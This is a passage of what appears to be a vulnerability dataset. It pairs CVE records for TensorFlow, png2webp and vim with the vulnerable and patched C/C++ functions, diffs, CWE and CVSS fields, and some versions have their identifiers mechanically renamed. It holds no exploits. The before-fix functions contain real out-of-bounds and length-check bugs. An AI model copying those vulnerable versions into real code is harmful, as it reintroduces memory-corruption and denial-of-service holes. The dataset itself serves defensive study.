            col_buffer_data, VAR_6.in_depth, VAR_6.spatial_dims[0].input_size,
            VAR_6.spatial_dims[1].input_size, VAR_6.spatial_dims[0].filter_size,
            VAR_6.spatial_dims[1].filter_size, VAR_14, VAR_16, VAR_15,
            VAR_17, VAR_6.spatial_dims[0].stride, VAR_6.spatial_dims[1].stride,
            VAR_41);

        VAR_41 += VAR_35;
      }
    } else {
      for (int VAR_43 = 0; VAR_43 < VAR_6.batch_size;
           VAR_43 += VAR_33) {
        const int VAR_48 =
            std::min(VAR_19<int>(VAR_33),
                     VAR_19<int>(VAR_6.batch_size) - VAR_43);

        auto VAR_49 = [&VAR_0, &VAR_6, &VAR_14, &VAR_16, &VAR_15,
                      &VAR_17, &output_image_size, &filter_total_size,
                      &VAR_41, &col_buffer_data,
                      &VAR_39, &VAR_37, &VAR_35,
                      &VAR_36, &VAR_27](int64_t VAR_50, int64_t VAR_51) {
          for (int VAR_52 = VAR_50; VAR_52 < VAR_51; ++VAR_52) {
            T* VAR_53 = col_buffer_data + VAR_52 * VAR_27;
            T* VAR_54 = VAR_41 + VAR_52 * VAR_35;
            const T* VAR_55 = VAR_39 + VAR_52 * VAR_36;

            VAR_56<T>()(
                VAR_0, VAR_55, VAR_37, filter_total_size,
                output_image_size, VAR_6.out_depth, VAR_53);

            VAR_47<T>(VAR_53, VAR_6.in_depth,
                      VAR_6.spatial_dims[0].input_size,
                      VAR_6.spatial_dims[1].input_size,
                      VAR_6.spatial_dims[0].filter_size,
                      VAR_6.spatial_dims[1].filter_size, VAR_14, VAR_16,
                      VAR_15, VAR_17, VAR_6.spatial_dims[0].stride,
                      VAR_6.spatial_dims[1].stride, VAR_54);
          }
        };
        Shard(VAR_29.num_threads, VAR_29.workers, VAR_48,
              VAR_28, VAR_49);

        VAR_41 += VAR_35 * VAR_48;
        VAR_39 += VAR_36 * VAR_48;
      }
    }
  }",,"--- func_before
+++ func_after
@@ -39,6 +39,15 @@
       return;
     }
 
+    // If shapes are valid but `out_backprop` is empty, in_backprop should be
+    // set to all zeros.  Otherwise, cudnn/dnnl fail with an empty input.
+    if (out_backprop.NumElements() == 0) {
+      functor::SetZeroFunctor<Device, T> set_zero;
+      set_zero(context->eigen_device<Device>(),
+               in_backprop->template flat<T>());
+      return;
+    }
+
 // TODO(ezhulenev): Remove custom kernel and move XSMM support to
 // LaunchConv2DBackpropInputOp functor.
 #if defined TENSORFLOW_USE_LIBXSMM_CONVOLUTIONS && \","{'deleted_lines': [], 'added_lines': ['    // If shapes are valid but `out_backprop` is empty, in_backprop should be', '    // set to all zeros.  Otherwise, cudnn/dnnl fail with an empty input.', '    if (out_backprop.NumElements() == 0) {', '      functor::SetZeroFunctor<Device, T> set_zero;', '      set_zero(context->eigen_device<Device>(),', '               in_backprop->template flat<T>());', '      return;', '    }', '']}",True,"TensorFlow is an open source platform for machine learning. When `Conv2DBackpropInput` receives empty `out_backprop` inputs (e.g. `[3, 1, 0, 1]`), the current CPU/GPU kernels `CHECK` fail (one with dnnl, the other with cudnn). This can be used to trigger a denial of service attack. We have patched the issue in GitHub commit 27a65a43cf763897fecfa5cdb5cc653fc5dd0346. The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range. There are no known workarounds for this issue.",5.9,MEDIUM,1,valid,2022-07-20T20:32:38Z,4
CVE-2022-36752,['CWE-787'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,landfillbaby/png2webp,v1.0.5: fix buffer overrun when reading bad WebPs,8f21ad79b0cd98fc22d5b49734543101946abbff,https://github.com/landfillbaby/png2webp/commit/8f21ad79b0cd98fc22d5b49734543101946abbff,png2webp.c,w2p,"static bool w2p(char *ip, char *op) {
FILE *fp = openr(ip);
if(!fp) return 1;
bool openwdone = 0;
uint8_t *x = 0, *b = 0;
png_struct *p = 0;
png_info *n = 0;
uint8_t i[12];
char *k[] = {""Out of memory"", ""Broken config, file a bug report"",
""Invalid WebP"", ""???"", ""???"", ""???"", ""I/O error""};
if(!fread(i, 12, 1, fp)) {
PF(""ERROR reading %s: %s"", IP, k[6]);
goto w2p_close;
}
if(memcmp(i, (char[4]){""RIFF""}, 4) || memcmp(i + 8, (char[4]){""WEBP""}, 4)) {
PF(""ERROR reading %s: %s"", IP, k[2]);
goto w2p_close;
}
size_t l = ((uint32_t)(i[4] | (i[5] << 8) | (i[6] << 16) | (i[7] << 24))) + 8;
x = malloc(l);
if(!x) {
PF(""ERROR reading %s: %s"", IP, *k);
goto w2p_close;
}
memcpy(x, i, 12);   if(!fread(x + 12, l - 12, 1, fp)) {
PF(""ERROR reading %s: %s"", IP, k[6]);
goto w2p_close;
}
fclose(fp);
#if defined LOSSYISERROR || defined NOTHREADS
WebPBitstreamFeatures I;
#else
WebPDecoderConfig c = {.options.use_threads = 1};
#define I c.input
#endif
VP8StatusCode r = WebPGetFeatures(x, l, &I);
if(r) {
PF(""ERROR reading %s: %s"", IP, k[r - 1]);
goto w2p_free;
}
#define V I.format
#define W ((uint32_t)I.width)
#define H ((uint32_t)I.height)
#define A I.has_alpha
#ifdef LOSSYISERROR
#define FMTSTR
#define FMTARG
#define ANMSTR ""%s""
#define ANMARG , ""animat""
#else
char *f[] = {""undefined/mixed"", ""lossy"", ""lossless""};
#define FMTSTR ""\nFormat: %s""
#define FMTARG , f[V]
#define ANMSTR ""animat""
#define ANMARG
#endif
PFV(""Info: %s:\nDimensions: %"" PRIu32 "" x %"" PRIu32
""\nSize: %zu bytes (%.15g bpp)\nUses alpha: %s"" FMTSTR,
IP, W, H, l, (double)l * 8 / (W * H), A ? ""yes"" : ""no"" FMTARG);
if(I.has_animation) {
PF(""ERROR reading %s: Unsupported feature: "" ANMSTR ""ion"", IP ANMARG);
goto w2p_free;
}
#ifdef LOSSYISERROR
if(V != 2) {
PF(""ERROR reading %s: Unsupported feature: %sion"", IP, ""lossy compress"");
goto w2p_free;
}
#endif
#define B ((unsigned)(3 + A))
b = malloc(W * H * B);
if(!b) {
PF(""ERROR reading %s: %s"", IP, *k);
goto w2p_free;
}
#if defined LOSSYISERROR || defined NOTHREADS
if(!(A ? WebPDecodeRGBAInto : WebPDecodeRGBInto)(
x, l, b, W * H * B, (int)(W * B))) {
PF(""ERROR reading %s: %s"", IP, k[2]);
goto w2p_free;
}
#else
c.output.colorspace = A ? MODE_RGBA : MODE_RGB;
c.output.is_external_memory = 1;
#define D c.output.u.RGBA
D.rgba = b;
D.stride = (int)(W * B);
D.size = W * H * B;
r = WebPDecode(x, l, &c);
if(r) {
PF(""ERROR reading %s: %s"", IP, k[r - 1]);
goto w2p_free;
}
#endif
free(x);
x = 0;
if(!(fp = openw(op))) goto w2p_free;
openwdone = !!op;
p = png_create_write_struct(PNG_LIBPNG_VER_STRING, op, pngwerr, pngwarn);
if(!p) {
PF(""ERROR writing %s: %s"", OP, *k);
goto w2p_close;
}
n = png_create_info_struct(p);
if(!n) {
PF(""ERROR writing %s: %s"", OP, *k);
goto w2p_close;
}
if(setjmp(png_jmpbuf(p))) {
w2p_close:
fclose(fp);
w2p_free:
if(openwdone) remove(op);
free(x);
free(b);
png_destroy_write_struct(&p, &n);
return 1;
}
pnglen = 0;
png_set_write_fn(p, fp, pngwrite, pngflush);
png_set_filter(p, 0, PNG_ALL_FILTERS);
png_set_compression_level(p, 9);
png_set_IHDR(p, n, W, H, 8, A ? 6 : 2, 0, 0, 0);
png_write_info(p, n);
uint8_t *w = b;
for(unsigned y = H; y; y--) {
png_write_row(p, w);
w += W * B;
}
png_write_end(p, n);
png_destroy_write_struct(&p, &n);
p = 0;
n = 0;
free(b);
b = 0;
if(fclose(fp)) {
PF(""ERROR closing %s: %s"", OP, strerror(errno));
goto w2p_free;
}
PFV(""Info: %s:\nDimensions: %"" PRIu32 "" x %"" PRIu32
""\nSize: %zu bytes (%.15g bpp)\nFormat: %u-bit %s%s%s\nGamma: %.5g"",
OP, W, H, pnglen, (double)pnglen * 8 / (W * H), 8, A ? ""RGBA"" : ""RGB"", """",
"""", 1 / 2.2);
return 0;
}","static bool w2p(char *VAR_0, char *VAR_1) {
FILE *VAR_2 = openr(VAR_0);
if(!VAR_2) return 1;
bool VAR_3 = 0;
uint8_t *VAR_4 = 0, *VAR_5 = 0;
png_struct *VAR_6 = 0;
png_info *VAR_7 = 0;
uint8_t VAR_8[12];
char *VAR_9[] = {""Out of memory"", ""Broken config, file a bug report"",
""Invalid WebP"", ""???"", ""???"", ""???"", ""I/O error""};
if(!fread(VAR_8, 12, 1, VAR_2)) {
PF(""ERROR reading %s: %s"", VAR_10, VAR_9[6]);
goto w2p_close;
}
if(memcmp(VAR_8, (char[4]){""RIFF""}, 4) || memcmp(VAR_8 + 8, (char[4]){""WEBP""}, 4)) {
PF(""ERROR reading %s: %s"", VAR_10, VAR_9[2]);
goto w2p_close;
}
size_t VAR_11 = ((uint32_t)(VAR_8[4] | (VAR_8[5] << 8) | (VAR_8[6] << 16) | (VAR_8[7] << 24))) + 8;
VAR_4 = malloc(VAR_11);
if(!VAR_4) {
PF(""ERROR reading %s: %s"", VAR_10, *VAR_9);
goto w2p_close;
}
memcpy(VAR_4, VAR_8, 12); 
if(!fread(VAR_4 + 12, VAR_11 - 12, 1, VAR_2)) {
PF(""ERROR reading %s: %s"", VAR_10, VAR_9[6]);
goto w2p_close;
}
fclose(VAR_2);
#if defined VAR_12 || defined VAR_13
WebPBitstreamFeatures VAR_14;
#else
WebPDecoderConfig VAR_15 = {.options.use_threads = 1};
#define VAR_14 c.input
#endif
VP8StatusCode VAR_16 = WebPGetFeatures(VAR_4, VAR_11, &VAR_14);
if(VAR_16) {
PF(""ERROR reading %s: %s"", VAR_10, VAR_9[VAR_16 - 1]);
goto w2p_free;
}
#define VAR_17 I.format
#define VAR_18 ((uint32_t)I.width)
#define VAR_19 ((uint32_t)I.height)
#define VAR_20 I.has_alpha
#ifdef VAR_12
#define VAR_21
#define VAR_22
#define VAR_23 ""%s""
#define VAR_24 , ""animat""
#else
char *VAR_25[] = {""undefined/mixed"", ""lossy"", ""lossless""};
#define VAR_21 ""\nFormat: %s""
#define VAR_22 , f[V]
#define VAR_23 ""animat""
#define VAR_24
#endif
PFV(""Info: %s:\nDimensions: %"" VAR_26 "" x %"" VAR_26
""\nSize: %zu bytes (%.15g bpp)\nUses alpha: %s"" VAR_21,
VAR_10, VAR_18, VAR_19, VAR_11, (double)VAR_11 * 8 / (VAR_18 * VAR_19), VAR_20 ? ""yes"" : ""no"" VAR_22);
if(VAR_14.has_animation) {
PF(""ERROR reading %s: Unsupported feature: "" VAR_23 ""ion"", VAR_10 VAR_24);
goto w2p_free;
}
#ifdef VAR_12
if(VAR_17 != 2) {
PF(""ERROR reading %s: Unsupported feature: %sion"", VAR_10, ""lossy compress"");
goto w2p_free;
}
#endif
#define VAR_27 ((unsigned)(3 + A))
VAR_5 = malloc(VAR_18 * VAR_19 * VAR_27);
if(!VAR_5) {
PF(""ERROR reading %s: %s"", VAR_10, *VAR_9);
goto w2p_free;
}
#if defined VAR_12 || defined VAR_13
if(!(VAR_20 ? VAR_28 : VAR_29)(
VAR_4, VAR_11, VAR_5, VAR_18 * VAR_19 * VAR_27, (int)(VAR_18 * VAR_27))) {
PF(""ERROR reading %s: %s"", VAR_10, VAR_9[2]);
goto w2p_free;
}
#else
VAR_15.output.colorspace = VAR_20 ? VAR_30 : VAR_31;
VAR_15.output.is_external_memory = 1;
#define VAR_32 c.output.u.RGBA
VAR_32.rgba = VAR_5;
VAR_32.stride = (int)(VAR_18 * VAR_27);
VAR_32.size = VAR_18 * VAR_19 * VAR_27;
VAR_16 = WebPDecode(VAR_4, VAR_11, &VAR_15);
if(VAR_16) {
PF(""ERROR reading %s: %s"", VAR_10, VAR_9[VAR_16 - 1]);
goto w2p_free;
}
#endif
free(VAR_4);
VAR_4 = 0;
if(!(VAR_2 = openw(VAR_1))) goto w2p_free;
VAR_3 = !!VAR_1;
VAR_6 = png_create_write_struct(VAR_33, VAR_1, VAR_34, VAR_35);
if(!VAR_6) {
PF(""ERROR writing %s: %s"", VAR_36, *VAR_9);
goto w2p_close;
}
VAR_7 = png_create_info_struct(VAR_6);
if(!VAR_7) {
PF(""ERROR writing %s: %s"", VAR_36, *VAR_9);
goto w2p_close;
}
if(setjmp(png_jmpbuf(VAR_6))) {
w2p_close:
fclose(VAR_2);
w2p_free:
if(VAR_3) remove(VAR_1);
free(VAR_4);
free(VAR_5);
png_destroy_write_struct(&VAR_6, &VAR_7);
return 1;
}
VAR_37 = 0;
png_set_write_fn(VAR_6, VAR_2, VAR_38, VAR_39);
png_set_filter(VAR_6, 0, VAR_40);
png_set_compression_level(VAR_6, 9);
png_set_IHDR(VAR_6, VAR_7, VAR_18, VAR_19, 8, VAR_20 ? 6 : 2, 0, 0, 0);
png_write_info(VAR_6, VAR_7);
uint8_t *VAR_41 = VAR_5;
for(unsigned VAR_42 = VAR_19; VAR_42; VAR_42--) {
png_write_row(VAR_6, VAR_41);
VAR_41 += VAR_18 * VAR_27;
}
png_write_end(VAR_6, VAR_7);
png_destroy_write_struct(&VAR_6, &VAR_7);
VAR_6 = 0;
VAR_7 = 0;
free(VAR_5);
VAR_5 = 0;
if(fclose(VAR_2)) {
PF(""ERROR closing %s: %s"", VAR_36, strerror(VAR_43));
goto w2p_free;
}
PFV(""Info: %s:\nDimensions: %"" VAR_26 "" x %"" VAR_26
""\nSize: %zu bytes (%.15g bpp)\nFormat: %u-bit %s%s%s\nGamma: %.5g"",
VAR_36, VAR_18, VAR_19, VAR_37, (double)VAR_37 * 8 / (VAR_18 * VAR_19), 8, VAR_20 ? ""RGBA"" : ""RGB"", """",
"""", 1 / 2.2);
return 0;
}",landfillbaby/png2webp/8f21ad79b0cd98fc22d5b49734543101946abbff/png2webp.c/vul/before/0.json,"static bool w2p(char *ip, char *op) {
  FILE *fp = openr(ip);
  if(!fp) return 1;
  bool openwdone = 0;
  uint8_t *x = 0, *b = 0;
  png_struct *p = 0;
  png_info *n = 0;
  uint8_t i[12];
  char *k[] = {""Out of memory"", ""Broken config, file a bug report"",
    ""Invalid WebP"", ""???"", ""???"", ""???"", ""I/O error""};
  // unsupported feature, suspended, canceled
  if(!fread(i, 12, 1, fp)) {
    PF(""ERROR reading %s: %s"", IP, k[6]);
    goto w2p_close;
  }
  if(memcmp(i, (char[4]){""RIFF""}, 4) || memcmp(i + 8, (char[4]){""WEBP""}, 4)) {
    PF(""ERROR reading %s: %s"", IP, k[2]);
    goto w2p_close;
  }
  size_t l = ((uint32_t)(i[4] | (i[5] << 8) | (i[6] << 16) | (i[7] << 24))) + 8;
  // ^ RIFF header size
  if(l <= 12
#ifdef SSIZE_MAX
    || l - 12 > SSIZE_MAX
#endif
  ) {
    PF(""ERROR reading %s: %s"", IP, k[2]);
    goto w2p_close;
  }
  x = malloc(l);
  if(!x) {
    PF(""ERROR reading %s: %s"", IP, *k);
    goto w2p_close;
  }
  memcpy(x, i, 12); // should optimize out
  if(!fread(x + 12, l - 12, 1, fp)) {
    PF(""ERROR reading %s: %s"", IP, k[6]);
    goto w2p_close;
  }
  fclose(fp);
#if defined LOSSYISERROR || defined NOTHREADS
  WebPBitstreamFeatures I;
#else
  WebPDecoderConfig c = {.options.use_threads = 1};
#define I c.input
#endif
  VP8StatusCode r = WebPGetFeatures(x, l, &I);
  if(r) {
    PF(""ERROR reading %s: %s"", IP, k[r - 1]);
    goto w2p_free;
  }
#define V I.format
#define W ((uint32_t)I.width)
#define H ((uint32_t)I.height)
#define A I.has_alpha
#ifdef LOSSYISERROR
#define FMTSTR
#define FMTARG
#define ANMSTR ""%s""
#define ANMARG , ""animat""
#else
  char *f[] = {""undefined/mixed"", ""lossy"", ""lossless""};
#define FMTSTR ""\nFormat: %s""
#define FMTARG , f[V]
#define ANMSTR ""animat""
#define ANMARG
#endif
  PFV(""Info: %s:\nDimensions: %"" PRIu32 "" x %"" PRIu32
      ""\nSize: %zu bytes (%.15g bpp)\nUses alpha: %s"" FMTSTR,
    IP, W, H, l, (double)l * 8 / (W * H), A ? ""yes"" : ""no"" FMTARG);
  if(I.has_animation) {
    PF(""ERROR reading %s: Unsupported feature: "" ANMSTR ""ion"", IP ANMARG);
    goto w2p_free;
  }
#ifdef LOSSYISERROR
  if(V != 2) {
    PF(""ERROR reading %s: Unsupported feature: %sion"", IP, ""lossy compress"");
    goto w2p_free;
  }
#endif
#define B ((unsigned)(3 + A))
  b = malloc(W * H * B);
  if(!b) {
    PF(""ERROR reading %s: %s"", IP, *k);
    goto w2p_free;
  }
#if defined LOSSYISERROR || defined NOTHREADS
  if(!(A ? WebPDecodeRGBAInto : WebPDecodeRGBInto)(
       x, l, b, W * H * B, (int)(W * B))) {
    PF(""ERROR reading %s: %s"", IP, k[2]);
    goto w2p_free;
  }
#else
  c.output.colorspace = A ? MODE_RGBA : MODE_RGB;
  c.output.is_external_memory = 1;
#define D c.output.u.RGBA
  D.rgba = b;
  D.stride = (int)(W * B);
  D.size = W * H * B;
  r = WebPDecode(x, l, &c);
  if(r) {
    PF(""ERROR reading %s: %s"", IP, k[r - 1]);
    goto w2p_free;
  }
#endif
  free(x);
  x = 0;
  if(!(fp = openw(op))) goto w2p_free;
  openwdone = !!op;
  p = png_create_write_struct(PNG_LIBPNG_VER_STRING, op, pngwerr, pngwarn);
  if(!p) {
    PF(""ERROR writing %s: %s"", OP, *k);
    goto w2p_close;
  }
  n = png_create_info_struct(p);
  if(!n) {
    PF(""ERROR writing %s: %s"", OP, *k);
    goto w2p_close;
  }
  if(setjmp(png_jmpbuf(p))) {
  w2p_close:
    fclose(fp);
  w2p_free:
    if(openwdone) remove(op);
    free(x);
    free(b);
    png_destroy_write_struct(&p, &n);
    return 1;
  }
  pnglen = 0;
  png_set_write_fn(p, fp, pngwrite, pngflush);
  png_set_filter(p, 0, PNG_ALL_FILTERS);
  png_set_compression_level(p, 9);
  // png_set_compression_memlevel(p, 9);
  png_set_IHDR(p, n, W, H, 8, A ? 6 : 2, 0, 0, 0);
  png_write_info(p, n);
  uint8_t *w = b;
  for(unsigned y = H; y; y--) {
    png_write_row(p, w);
    w += W * B;
  }
  png_write_end(p, n);
  png_destroy_write_struct(&p, &n);
  p = 0;
  n = 0;
  free(b);
  b = 0;
  if(fclose(fp)) {
    PF(""ERROR closing %s: %s"", OP, strerror(errno));
    goto w2p_free;
  }
  PFV(""Info: %s:\nDimensions: %"" PRIu32 "" x %"" PRIu32
      ""\nSize: %zu bytes (%.15g bpp)\nFormat: %u-bit %s%s%s\nGamma: %.5g"",
    OP, W, H, pnglen, (double)pnglen * 8 / (W * H), 8, A ? ""RGBA"" : ""RGB"", """",
    """", 1 / 2.2);
  return 0;
}","static bool w2p(char *VAR_0, char *VAR_1) {
  FILE *VAR_2 = openr(VAR_0);
  if(!VAR_2) return 1;
  bool VAR_3 = 0;
  uint8_t *VAR_4 = 0, *VAR_5 = 0;
  png_struct *VAR_6 = 0;
  png_info *VAR_7 = 0;
  uint8_t VAR_8[12];
  char *VAR_9[] = {""Out of memory"", ""Broken config, file a bug report"",
    ""Invalid WebP"", ""???"", ""???"", ""???"", ""I/O error""};
  /* COMMENT_0 */
  if(!fread(VAR_8, 12, 1, VAR_2)) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[6]);
    goto w2p_close;
  }
  if(memcmp(VAR_8, (char[4]){""RIFF""}, 4) || memcmp(VAR_8 + 8, (char[4]){""WEBP""}, 4)) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[2]);
    goto w2p_close;
  }
  size_t VAR_11 = ((uint32_t)(VAR_8[4] | (VAR_8[5] << 8) | (VAR_8[6] << 16) | (VAR_8[7] << 24))) + 8;
  /* COMMENT_1 */
  if(VAR_11 <= 12
#ifdef VAR_12
    || VAR_11 - 12 > VAR_12
#endif
  ) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[2]);
    goto w2p_close;
  }
  VAR_4 = malloc(VAR_11);
  if(!VAR_4) {
    PF(""ERROR reading %s: %s"", VAR_10, *VAR_9);
    goto w2p_close;
  }
  memcpy(VAR_4, VAR_8, 12); /* COMMENT_2 */
  if(!fread(VAR_4 + 12, VAR_11 - 12, 1, VAR_2)) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[6]);
    goto w2p_close;
  }
  fclose(VAR_2);
#if defined VAR_13 || defined VAR_14
  WebPBitstreamFeatures VAR_15;
#else
  WebPDecoderConfig VAR_16 = {.options.use_threads = 1};
#define VAR_15 c.input
#endif
  VP8StatusCode VAR_17 = WebPGetFeatures(VAR_4, VAR_11, &VAR_15);
  if(VAR_17) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[VAR_17 - 1]);
    goto w2p_free;
  }
#define VAR_18 I.format
#define VAR_19 ((uint32_t)I.width)
#define VAR_20 ((uint32_t)I.height)
#define VAR_21 I.has_alpha
#ifdef VAR_13
#define VAR_22
#define VAR_23
#define VAR_24 ""%s""
#define VAR_25 , ""animat""
#else
  char *VAR_26[] = {""undefined/mixed"", ""lossy"", ""lossless""};
#define VAR_22 ""\nFormat: %s""
#define VAR_23 , f[V]
#define VAR_24 ""animat""
#define VAR_25
#endif
  PFV(""Info: %s:\nDimensions: %"" VAR_27 "" x %"" VAR_27
      ""\nSize: %zu bytes (%.15g bpp)\nUses alpha: %s"" VAR_22,
    VAR_10, VAR_19, VAR_20, VAR_11, (double)VAR_11 * 8 / (VAR_19 * VAR_20), VAR_21 ? ""yes"" : ""no"" VAR_23);
  if(VAR_15.has_animation) {
    PF(""ERROR reading %s: Unsupported feature: "" VAR_24 ""ion"", VAR_10 VAR_25);
    goto w2p_free;
  }
#ifdef VAR_13
  if(VAR_18 != 2) {
    PF(""ERROR reading %s: Unsupported feature: %sion"", VAR_10, ""lossy compress"");
    goto w2p_free;
  }
#endif
#define VAR_28 ((unsigned)(3 + A))
  VAR_5 = malloc(VAR_19 * VAR_20 * VAR_28);
  if(!VAR_5) {
    PF(""ERROR reading %s: %s"", VAR_10, *VAR_9);
    goto w2p_free;
  }
#if defined VAR_13 || defined VAR_14
  if(!(VAR_21 ? VAR_29 : VAR_30)(
       VAR_4, VAR_11, VAR_5, VAR_19 * VAR_20 * VAR_28, (int)(VAR_19 * VAR_28))) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[2]);
    goto w2p_free;
  }
#else
  VAR_16.output.colorspace = VAR_21 ? VAR_31 : VAR_32;
  VAR_16.output.is_external_memory = 1;
#define VAR_33 c.output.u.RGBA
  VAR_33.rgba = VAR_5;
  VAR_33.stride = (int)(VAR_19 * VAR_28);
  VAR_33.size = VAR_19 * VAR_20 * VAR_28;
  VAR_17 = WebPDecode(VAR_4, VAR_11, &VAR_16);
  if(VAR_17) {
    PF(""ERROR reading %s: %s"", VAR_10, VAR_9[VAR_17 - 1]);
    goto w2p_free;
  }
#endif
  free(VAR_4);
  VAR_4 = 0;
  if(!(VAR_2 = openw(VAR_1))) goto w2p_free;
  VAR_3 = !!VAR_1;
  VAR_6 = png_create_write_struct(VAR_34, VAR_1, VAR_35, VAR_36);
  if(!VAR_6) {
    PF(""ERROR writing %s: %s"", VAR_37, *VAR_9);
    goto w2p_close;
  }
  VAR_7 = png_create_info_struct(VAR_6);
  if(!VAR_7) {
    PF(""ERROR writing %s: %s"", VAR_37, *VAR_9);
    goto w2p_close;
  }
  if(setjmp(png_jmpbuf(VAR_6))) {
  w2p_close:
    fclose(VAR_2);
  w2p_free:
    if(VAR_3) remove(VAR_1);
    free(VAR_4);
    free(VAR_5);
    png_destroy_write_struct(&VAR_6, &VAR_7);
    return 1;
  }
  VAR_38 = 0;
  png_set_write_fn(VAR_6, VAR_2, VAR_39, VAR_40);
  png_set_filter(VAR_6, 0, VAR_41);
  png_set_compression_level(VAR_6, 9);
  /* COMMENT_3 */
  png_set_IHDR(VAR_6, VAR_7, VAR_19, VAR_20, 8, VAR_21 ? 6 : 2, 0, 0, 0);
  png_write_info(VAR_6, VAR_7);
  uint8_t *VAR_42 = VAR_5;
  for(unsigned VAR_43 = VAR_20; VAR_43; VAR_43--) {
    png_write_row(VAR_6, VAR_42);
    VAR_42 += VAR_19 * VAR_28;
  }
  png_write_end(VAR_6, VAR_7);
  png_destroy_write_struct(&VAR_6, &VAR_7);
  VAR_6 = 0;
  VAR_7 = 0;
  free(VAR_5);
  VAR_5 = 0;
  if(fclose(VAR_2)) {
    PF(""ERROR closing %s: %s"", VAR_37, strerror(VAR_44));
    goto w2p_free;
  }
  PFV(""Info: %s:\nDimensions: %"" VAR_27 "" x %"" VAR_27
      ""\nSize: %zu bytes (%.15g bpp)\nFormat: %u-bit %s%s%s\nGamma: %.5g"",
    VAR_37, VAR_19, VAR_20, VAR_38, (double)VAR_38 * 8 / (VAR_19 * VAR_20), 8, VAR_21 ? ""RGBA"" : ""RGB"", """",
    """", 1 / 2.2);
  return 0;
}",landfillbaby/png2webp/8f21ad79b0cd98fc22d5b49734543101946abbff/png2webp.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -19,6 +19,14 @@
   }
   size_t l = ((uint32_t)(i[4] | (i[5] << 8) | (i[6] << 16) | (i[7] << 24))) + 8;
   // ^ RIFF header size
+  if(l <= 12
+#ifdef SSIZE_MAX
+    || l - 12 > SSIZE_MAX
+#endif
+  ) {
+    PF(""ERROR reading %s: %s"", IP, k[2]);
+    goto w2p_close;
+  }
   x = malloc(l);
   if(!x) {
     PF(""ERROR reading %s: %s"", IP, *k);","{'deleted_lines': [], 'added_lines': ['  if(l <= 12', '#ifdef SSIZE_MAX', '    || l - 12 > SSIZE_MAX', '#endif', '  ) {', '    PF(""ERROR reading %s: %s"", IP, k[2]);', '    goto w2p_close;', '  }']}",True,png2webp v1.0.4 was discovered to contain an out-of-bounds write via the function w2p. This vulnerability is exploitable via a crafted png file.,5.5,MEDIUM,1,valid,2022-07-23T20:18:44Z,4
CVE-2022-2598,['CWE-787'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,vim,"patch 9.0.0101: invalid memory access in diff mode with ""dp"" and undo

Problem:    Invalid memory access in diff mode with ""dp"" and undo.
Solution:   Make sure the line number does not go below one.",4e677b9c40ccbc5f090971b31dc2fe07bf05541d,https://github.com/vim/vim/commit/4e677b9c40ccbc5f090971b31dc2fe07bf05541d,src/diff.c,ex_diffgetput,"void
ex_diffgetput(exarg_T *eap)
{
linenr_Tlnum;
intcount;
linenr_Toff = 0;
diff_T*dp;
diff_T*dprev;
diff_T*dfree;
intidx_cur;
intidx_other;
intidx_from;
intidx_to;
inti;
intadded;
char_u*p;
aco_save_Taco;
buf_T*buf;
intstart_skip, end_skip;
intnew_count;
intbuf_empty;
intfound_not_ma = FALSE;
idx_cur = diff_buf_idx(curbuf);
if (idx_cur == DB_COUNT)
{
emsg(_(e_current_buffer_is_not_in_diff_mode));
return;
}
if (*eap->arg == NUL)
{
for (idx_other = 0; idx_other < DB_COUNT; ++idx_other)
if (curtab->tp_diffbuf[idx_other] != curbuf
&& curtab->tp_diffbuf[idx_other] != NULL)
{
if (eap->cmdidx != CMD_diffput
|| curtab->tp_diffbuf[idx_other]->b_p_ma)
break;
found_not_ma = TRUE;
}
if (idx_other == DB_COUNT)
{
if (found_not_ma)
emsg(_(e_no_other_buffer_in_diff_mode_is_modifiable));
else
emsg(_(e_no_other_buffer_in_diff_mode));
return;
}
for (i = idx_other + 1; i < DB_COUNT; ++i)
if (curtab->tp_diffbuf[i] != curbuf
&& curtab->tp_diffbuf[i] != NULL
&& (eap->cmdidx != CMD_diffput || curtab->tp_diffbuf[i]->b_p_ma))
{
emsg(_(e_more_than_two_buffers_in_diff_mode_dont_know_which_one_to_use));
return;
}
}
else
{
p = eap->arg + STRLEN(eap->arg);
while (p > eap->arg && VIM_ISWHITE(p[-1]))
--p;
for (i = 0; vim_isdigit(eap->arg[i]) && eap->arg + i < p; ++i)
;
if (eap->arg + i == p)        i = atol((char *)eap->arg);
else
{
i = buflist_findpat(eap->arg, p, FALSE, TRUE, FALSE);
if (i < 0)
return;}
buf = buflist_findnr(i);
if (buf == NULL)
{
semsg(_(e_cant_find_buffer_str), eap->arg);
return;
}
if (buf == curbuf)
return;idx_other = diff_buf_idx(buf);
if (idx_other == DB_COUNT)
{
semsg(_(e_buffer_str_is_not_in_diff_mode), eap->arg);
return;
}
}
diff_busy = TRUE;
if (eap->addr_count == 0)
{
if (eap->cmdidx == CMD_diffget
&& eap->line1 == curbuf->b_ml.ml_line_count
&& diff_check(curwin, eap->line1) == 0
&& (eap->line1 == 1 || diff_check(curwin, eap->line1 - 1) == 0))
++eap->line2;
else if (eap->line1 > 0)
--eap->line1;
}
if (eap->cmdidx == CMD_diffget)
{
idx_from = idx_other;
idx_to = idx_cur;
}
else
{
idx_from = idx_cur;
idx_to = idx_other;
aucmd_prepbuf(&aco, curtab->tp_diffbuf[idx_other]);
}
if (!curbuf->b_changed)
{
change_warning(0);
if (diff_buf_idx(curbuf) != idx_to)
{
emsg(_(e_buffer_changed_unexpectedly));
goto theend;
}
}
dprev = NULL;
for (dp = curtab->tp_first_diff; dp != NULL; )
{
if (dp->df_lnum[idx_cur] > eap->line2 + off)
break;
dfree = NULL;
lnum = dp->df_lnum[idx_to];
count = dp->df_count[idx_to];
if (dp->df_lnum[idx_cur] + dp->df_count[idx_cur] > eap->line1 + off
&& u_save(lnum - 1, lnum + count) != FAIL)
{
start_skip = 0;
end_skip = 0;
if (eap->addr_count > 0)
{
start_skip = eap->line1 + off - dp->df_lnum[idx_cur];
if (start_skip > 0)
{
if (start_skip > count)
{
lnum += count;
count = 0;
